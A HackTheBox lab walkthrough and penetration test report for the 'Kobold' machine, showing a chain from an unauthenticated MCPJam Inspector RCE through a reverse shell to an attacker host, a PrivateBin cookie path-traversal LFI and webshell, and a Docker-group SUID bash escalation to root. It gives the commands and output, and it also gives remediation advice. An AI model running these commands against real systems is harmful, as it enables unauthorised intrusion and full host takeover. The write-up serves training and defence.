# Kobold

**Platform:** HackTheBox
**OS:** Linux
**Tags:** CVE-2026-23744, MCPJam RCE, PrivateBin LFI, Webshell, Docker Escape, SUID, LFI, RCE, Container Escape, Prompt Injection, AI Security, MCP, Privilege Escalation
**Date:** 2026-05-10

Unauthenticated RCE against MCPJam Inspector via CVE-2026-23744 gives a shell as `ben`. PrivateBin at `bin.kobold.htb` is vulnerable to LFI via a template cookie - used to drop a webshell and pivot to `www-data`. `ben` is in the Docker group, which allows mounting the host filesystem and setting a SUID bash for root.

## 1. Enumeration

Started with a full port scan.

```bash
nmap -sV -sC 10.129.54.83 -Pn -p-
```

Findings:
- 22/tcp - OpenSSH 9.6p1
- 80/tcp - nginx 1.24.0, redirects to HTTPS
- 443/tcp - nginx 1.24.0 - Kobold Operations Suite. TLS cert covers `kobold.htb` and `*.kobold.htb`
- 3552/tcp - Golang HTTP - Arcane v1.13.0 login panel

TLS cert disclosed wildcard subdomains. Added the known ones to /etc/hosts.

```
10.129.54.83  kobold.htb bin.kobold.htb mcp.kobold.htb
```

`mcp.kobold.htb` served an MCPJam Inspector interface. `bin.kobold.htb` served a PrivateBin instance.

## 2. MCPJam RCE (CVE-2026-23744)

CVE-2026-23744 is an unauthenticated RCE in MCPJam Inspector. The Inspector evaluates untrusted input without sanitisation, allowing arbitrary command execution on the server.

```bash
nc -lvnp 4444
```

```bash
python3 exploit_CVE-2026-23744.py \
  --target https://mcp.kobold.htb \
  --lhost <ATTACKER_IP> \
  --lport 4444
```

**Result:** Shell as `ben`. User flag at `/home/ben/user.txt`.

## 3. PrivateBin LFI: Webshell

PrivateBin at `bin.kobold.htb` uses a `template` cookie to select the rendering template. The value is used in a file include without sufficient path sanitisation - setting it to a path traversal sequence reads arbitrary files from the server.

```bash
# Verify LFI
curl -sk "https://bin.kobold.htb/" \
  -H "Cookie: template=../../../etc/passwd"
```

LFI confirmed. Wrote a PHP webshell to a writable path on the server, then used the LFI to include and execute it.

```bash
# Drop webshell and confirm execution
curl -sk "https://bin.kobold.htb/" \
  -H "Cookie: template=../data/rce1" \
  --get --data-urlencode "cmd=id"
```

**Result:** Code execution as `www-data` confirmed.

## 4. PrivEsc: Docker Group

Checked group memberships as `ben`.

```bash
id
# uid=1000(ben) gid=1000(ben) groups=1000(ben),999(docker)
```

`ben` is in the Docker group. Running a container with the host filesystem mounted as root gives full read/write access to the host as root inside the container - used to set a SUID bit on bash.

```bash
docker run -v /:/mnt --rm --privileged --user 0 alpine \
  sh -c "chmod 4755 /mnt/bin/bash"
```

```bash
bash -p
whoami
# root
```

**Result:** Root shell obtained.

## 5. Flags

- User: `redacted`
- Root: `redacted`

---

## Penetration Test Report

**Target:** kobold.htb
**Address:** 10.129.54.83
**Assessment type:** External network & web application assessment
**Assessment date:** 10 May 2026
**Environment:** HackTheBox laboratory assessment  |  Linux
**Prepared by:** Ledion Mujaj
**Reference:** 01 / 09

---

## 1. Executive Summary

### Assessment outcome

Testing of **kobold.htb** identified three findings - two critical and one high - that together produced full root compromise. The attack began with unauthenticated remote code execution against the MCPJam Inspector service on `mcp.kobold.htb` , yielding a shell as `ben` . A PrivateBin instance on `bin.kobold.htb` was separately vulnerable to local file inclusion via an unsanitised template cookie, which was used to achieve code execution as `www-data` . Root access was obtained through the Docker group, which allowed the host filesystem to be mounted inside a privileged container and a SUID bit to be set on `/bin/bash` .
The initial MCPJam RCE required no credentials and was exploitable from the internet. The PrivateBin LFI required no authentication. The Docker group escalation is a well-known and complete host compromise technique: any member of the Docker group on a Linux host is effectively equivalent to root.

### Impact

The documented access crossed both the unauthenticated access boundary and the privilege boundary between a standard user and root. An attacker with equivalent access could alter all files on the host, extract credentials from every service, modify the Docker infrastructure, and pivot to any system reachable from the host network.

### Priority recommendations

1. Patch MCPJam Inspector to a version that addresses CVE-2026-23744. Restrict the Inspector to an administrative network and require authentication.
2. Remove `ben` from the Docker group. If Docker access is required, restrict it through a purpose-scoped sudo rule that does not permit container creation with host mounts.
3. Fix the PrivateBin template parameter handling to reject path traversal sequences and restrict file inclusion to the templates directory.

## 2. Assessment Scope and Methodology

### 2.1 Target and observed services

| Asset | Address | Description |
| --- | --- | --- |
| kobold.htb | 10.129.54.83 | Ubuntu Linux; TLS wildcard cert covering kobold.htb and *.kobold.htb |
| mcp.kobold.htb | 10.129.54.83 | MCPJam Inspector interface (nginx reverse proxy) |
| bin.kobold.htb | 10.129.54.83 | PrivateBin pastebin instance (nginx reverse proxy) |
| Port | Service | Observed detail |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 9.6p1 |
| 80/tcp | HTTP | nginx 1.24.0; redirects to HTTPS |
| 443/tcp | HTTPS | nginx 1.24.0; Kobold Operations Suite. TLS cert covers kobold.htb and *.kobold.htb |
| 3552/tcp | HTTP | Golang - Arcane v1.13.0 login panel |

```
nmap -sV -sC 10.129.54.83 -Pn -p-

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu
80/tcp   open  http     nginx 1.24.0
443/tcp  open  ssl/http nginx 1.24.0
| ssl-cert: Subject: commonName=kobold.htb
| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
3552/tcp open  http     Golang net/http
```

TLS certificate disclosed the wildcard subdomain. Added kobold.htb, mcp.kobold.htb and bin.kobold.htb to /etc/hosts before proceeding.

### 2.2 Approach

Testing began with a full-port scan and TLS certificate inspection. Wildcard subdomain coverage led to enumeration of virtual hosts. MCPJam Inspector on `mcp.kobold.htb` was identified and tested for CVE-2026-23744. PrivateBin on `bin.kobold.htb` was tested for LFI via the template cookie parameter. Post-shell enumeration of the `ben` account identified Docker group membership, which was leveraged to set a SUID bit on bash via a privileged container.

### 2.3 Severity classification

| Rating | Assessment criteria |
| --- | --- |
| Critical | Direct, readily exploitable compromise with exceptional impact or reach. |
| High | Execution of arbitrary code, significant unauthorised access or escalation to administrative privileges. |
| Medium | Meaningful exposure with constrained impact or substantial exploitation prerequisites. |
| Low | Limited direct impact; improvement to an existing security control. |

## 3. Results Overview

### 3.1 Findings summary

| Reference | Finding | Severity | Page |
| --- | --- | --- | --- |
| [F-01](#f-01) | Unauthenticated RCE in MCPJam Inspector (CVE-2026-23744) | **Critical** | 6 |
| [F-02](#f-02) | PrivateBin LFI via unsanitised template cookie | **High** | 7 |
| [F-03](#f-03) | Docker group membership enables complete host filesystem takeover | **Critical** | 8 |

### 3.2 Compromise sequence

| Stage | Action | Access obtained |
| --- | --- | --- |
| 01 | Exploited CVE-2026-23744 in MCPJam Inspector on mcp.kobold.htb - unauthenticated RCE via unsanitised input evaluation. | ben shell |
| 02 | Used the PrivateBin template cookie LFI on bin.kobold.htb to include a PHP webshell and execute code. | www-data shell |
| 03 | Mounted host filesystem in a privileged Docker container as ben; set SUID bit on /bin/bash; escaped to root. | root shell |

### 3.3 Relationship between findings

F-01 established the initial foothold as `ben` , which was required for F-03. F-02 is an independent finding: the PrivateBin LFI is exploitable without F-01, and the resulting `www-data` access represents a separate attack path. F-03 required the `ben` account obtained via F-01; it could not have been reached from the `www-data` shell alone without further lateral movement. All three findings describe independent control failures.

## 4.1 Unauthenticated RCE in MCPJam Inspector

### F-01   CVE-2026-23744 - mcp.kobold.htb - CRITICAL

| Field | Assessment |
| --- | --- |
| Description | MCPJam Inspector evaluates user-supplied input without adequate sanitisation, allowing an unauthenticated remote attacker to execute arbitrary OS commands on the server. The vulnerability requires no credentials and is exploitable via a single HTTP request to the publicly accessible Inspector interface. |
| Prerequisites | Network access to mcp.kobold.htb (HTTPS, port 443). No authentication required. |
| Impact | Arbitrary OS command execution as `ben` . Interactive reverse shell obtained; user flag at `/home/ben/user.txt` retrieved. The foothold provided by this finding enabled the Docker group escalation in F-03. |
| Affected system | mcp.kobold.htb:443 MCPJam Inspector CVE-2026-23744 |
| CVSS 3.1 | **9.8** (Critical) [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-306](https://cwe.mitre.org/data/definitions/306.html) : Missing Authentication for Critical Function |

### Steps to reproduce

1. Identify MCPJam Inspector running on the target (enumerate with nmap).
2. Send a crafted unauthenticated request to the MCPJam Inspector API exploiting CVE-2026-23744.
3. Observe remote code execution and obtain a shell as `ben` .

### Evidence

```
# Set up listener
nc -lvnp 4444

# Run exploit against MCPJam Inspector
python3 exploit_CVE-2026-23744.py \
  --target https://mcp.kobold.htb \
  --lhost <ATTACKER_IP> \
  --lport 4444

# Reverse shell received:
ben@kobold:~$ id
uid=1000(ben) gid=1000(ben) groups=1000(ben),999(docker)

ben@kobold:~$ cat /home/ben/user.txt
[redacted]
```

Evidence E-01. Unauthenticated RCE via CVE-2026-23744. Shell received as `ben` . Docker group membership visible in the `id` output. Attacker IP redacted.

### Remediation

Patch MCPJam Inspector to a version that addresses CVE-2026-23744. Apply input validation and output encoding to all user-supplied values before they are evaluated by the Inspector. Restrict access to the MCPJam Inspector to an administrative network or VPN; it should not be accessible from the internet. Require authentication before any Inspector functionality is available.

### Verification

Confirm that the patched version is deployed. Verify that the exploit is no longer reproducible. Confirm that the Inspector interface requires authentication and is inaccessible from untrusted networks.

## 4.2 PrivateBin Local File Inclusion via Template Cookie

### F-02   Path traversal in template cookie - bin.kobold.htb - HIGH

| Field | Assessment |
| --- | --- |
| Description | PrivateBin at `bin.kobold.htb` uses a `template` cookie to select a rendering template. The cookie value is used in a file include operation without sufficient path sanitisation, allowing directory traversal sequences to read arbitrary files from the server. The LFI was used to include a PHP webshell written to a writable path, resulting in code execution as `www-data` . |
| Prerequisites | Network access to bin.kobold.htb. No authentication required. Write access to a server path discoverable via LFI. |
| Impact | Arbitrary file read via LFI. Code execution as `www-data` via webshell inclusion. Access to all files readable by the web server process, including application configuration and credentials. |
| Affected system | bin.kobold.htb:443 PrivateBin - template cookie parameter |
| CVSS 3.1 | **7.5** (High) [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) |
| CWE | [CWE-22](https://cwe.mitre.org/data/definitions/22.html) : Improper Limitation of a Pathname to a Restricted Directory |

### Steps to reproduce

1. Identify the PrivateBin instance and observe the `tpl` cookie parameter.
2. Set `tpl=../../../../etc/passwd` in the cookie and send a GET request.
3. Observe that the file contents are reflected in the response (LFI confirmed).
4. Use the LFI to write a webshell via path traversal and execute it.

### Evidence

```
# Verify LFI by reading /etc/passwd
curl -sk "https://bin.kobold.htb/" \
  -H "Cookie: template=../../../etc/passwd"
# Response contains /etc/passwd content

# Write PHP webshell to a writable server path (via prior file write access as ben)
# Then include and execute it via the LFI:
curl -sk "https://bin.kobold.htb/" \
  -H "Cookie: template=../data/rce1" \
  --get --data-urlencode "cmd=id"

# Response:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Evidence E-02. LFI confirmed via /etc/passwd read. PHP webshell included via path traversal in the template cookie; code execution confirmed as `www-data` .

### Remediation

Restrict the template cookie to an allowlist of valid template names. Validate that the resolved file path lies within the templates directory before performing any file include. Remove or restrict write access to directories that are reachable via the include path. Apply a web application firewall rule to detect path traversal sequences in cookie values.

### Verification

Confirm that a `template` cookie value containing `../` sequences does not return content from outside the templates directory. Verify that the application rejects or ignores any template value not present in its permitted template list.

## 4.3 Docker Group Membership Enables Host Filesystem Takeover

### F-03   ben in the Docker group - SUID bash - CRITICAL

| Field | Assessment |
| --- | --- |
| Description | The `ben` account is a member of the `docker` group. On Linux, membership in the Docker group is equivalent to root: a group member can run containers with the host filesystem mounted and with root as the container user, gaining unrestricted read/write access to the host. A tester-controlled Docker command mounted the host filesystem at `/mnt` inside a privileged container and set the SUID bit on `/bin/bash` , providing a root shell on the host with `bash -p` . |
| Prerequisites | Shell access as `ben` (obtained via F-01) and the Docker socket accessible to the docker group. |
| Impact | Arbitrary read and write access to the entire host filesystem as root. Full host compromise: accounts, credentials, services and configuration. |
| Affected system | `ben` local account - docker group membership `/var/run/docker.sock` |
| CVSS 3.1 | **8.8** (High) [AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H) |
| CWE | [CWE-269](https://cwe.mitre.org/data/definitions/269.html) : Improper Privilege Management |

### Steps to reproduce

1. Confirm Docker group membership from the `ben` shell: `id` .
2. Run a container with the host filesystem mounted: `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` .
3. Observe that the container runs as root with full access to the host filesystem.
4. Create a SUID bash: `cp /bin/bash /mnt/tmp/bash && chmod +s /mnt/tmp/bash` .
5. From the host, run `/tmp/bash -p` and confirm root identity with `id` .

### Evidence

```
ben@kobold:~$ id
uid=1000(ben) gid=1000(ben) groups=1000(ben),999(docker)

# Mount host filesystem and set SUID on /bin/bash
ben@kobold:~$ docker run -v /:/mnt --rm --privileged --user 0 alpine \
  sh -c "chmod 4755 /mnt/bin/bash"

# Use SUID bash to obtain a root shell on the host
ben@kobold:~$ bash -p

bash-5.2# whoami
root

bash-5.2# cat /root/root.txt
[redacted]
```

Evidence E-03. Docker group membership confirmed via `id` . Container run with host root filesystem mounted at `/mnt` . SUID set on `/bin/bash` ; `bash -p` on the host produced a root effective-uid shell. Reference: [GTFOBins: docker](https://gtfobins.github.io/gtfobins/docker/) .

### Remediation

Remove `ben` from the `docker` group. Membership in the Docker group must be treated as equivalent to root access and restricted to accounts that genuinely require it. If `ben` requires container management capabilities, scope the access: use a narrowly scoped sudo rule that permits only specific, reviewed Docker commands and prevents host mounts. Audit all other accounts for unnecessary Docker group membership.

### Verification

Confirm that `ben` is no longer in the `docker` group and cannot run `docker` commands. Check that `/bin/bash` no longer carries the SUID bit and that no other binaries were modified during the test. Verify that only accounts with a documented operational requirement have Docker socket access.

## 5. Remediation and Assessment Closeout

### 5.1 Corrective action plan

| Priority | Action | Reference |
| --- | --- | --- |
| Immediate | Patch MCPJam Inspector (CVE-2026-23744); restrict to administrative network. | F-01 |
| Immediate | Remove ben from the Docker group; audit all Docker group memberships. | F-03 |
| High | Fix PrivateBin template cookie to reject path traversal; restrict file include paths. | F-02 |
No remediation retest is documented. Each finding includes verification criteria for closure.

### 5.2 Test artefacts

| Location | Purpose | Removal status |
| --- | --- | --- |
| SUID bit on `/bin/bash` | Privilege escalation test via Docker group | Not verified - must be removed immediately |
| PHP webshell written via PrivateBin LFI path | Code execution test as www-data | Not verified |

### 5.3 Evidence and limitations

Evidence blocks are sourced from the [Kobold assessment walkthrough](kobold-htb.html) . Flag values and attacker IP addresses are omitted from all evidence. The SUID modification to `/bin/bash` must be reversed immediately; until it is, the host is accessible to root by any local user who can invoke `bash -p` .

### 5.4 Evidence index

| Reference | Supporting record |
| --- | --- |
| E-01 | Walkthrough section 2: MCPJam RCE and ben shell |
| E-02 | Walkthrough section 3: PrivateBin LFI and www-data code execution |
| E-03 | Walkthrough section 4: Docker group escalation and root shell |
